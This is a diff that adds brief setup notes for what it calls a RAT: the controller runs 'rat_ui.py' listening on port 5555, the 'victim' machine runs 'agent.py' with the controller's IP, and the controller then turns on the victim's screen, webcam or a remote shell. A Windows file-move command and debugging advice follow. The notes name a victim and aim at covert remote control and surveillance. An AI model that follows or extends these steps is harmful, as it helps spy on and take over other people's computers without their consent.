@@ -1,0 +1,30 @@
+
+order of operations
+
+
+
+Main PC: **python rat\_ui.py --port 5555** → window listening
+
+
+
+Victim: save **agent.py**, then
+
+**python agent.py <MAIN\_PC\_IP>** 5555
+
+
+
+Main UI status → session active → hit Screen ON / Webcam ON / shell
+
+
+
+If **victim** CMD shows an error after **python agent.py** ..., paste the full traceback.
+
+
+
+**MOVE IT**
+move /Y %USERPROFILE%\\Downloads\\rat\_ui.py %USERPROFILE%\\rat\_ui.py
+
+
+
+\--port 5555
+
